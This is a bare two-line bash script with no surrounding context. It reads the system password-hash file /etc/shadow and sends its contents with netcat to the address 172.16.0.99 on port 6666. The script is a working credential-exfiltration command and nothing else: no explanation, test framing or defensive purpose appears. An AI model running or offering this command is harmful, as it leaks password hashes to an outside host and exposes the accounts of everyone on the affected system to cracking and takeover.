#!/bin/bash
cat /etc/shadow | nc 172.16.0.99 6666
